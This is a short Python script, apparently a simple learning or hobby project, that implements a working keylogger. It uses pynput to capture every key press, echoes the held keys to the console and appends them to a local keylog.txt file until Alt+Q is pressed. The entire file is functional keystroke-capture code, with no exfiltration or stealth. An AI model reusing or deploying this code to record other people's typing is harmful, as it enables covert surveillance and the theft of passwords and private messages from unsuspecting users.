from pynput import keyboard


# The key combination to check
COMBINATION = {keyboard.Key.alt_l, keyboard.KeyCode.from_char('q')}


# List to store the currently pressed keys
current_keys = set()

def on_press(key):
    try:
        if(current_keys.__contains__(key)):
            return
        
        # Add the pressed key to the set of currently pressed keys
        current_keys.add(key)

        if all(k in current_keys for k in COMBINATION):
            print("Keylogger stopped.")
            return False
        
        # Record the currently pressed keys
        print(f"Key(s) pressed: {', '.join([str(k) for k in current_keys])}")
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"Key(s) pressed: {', '.join([str(k) for k in current_keys])}\n")
    except Exception as e:
        print(f"Erreur: {e}")

def on_release(key):
    try:
        # Remove the released key from the set of currently pressed keys
        current_keys.discard(key)
    except Exception as e:
        print(f"Erreur: {e}")

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()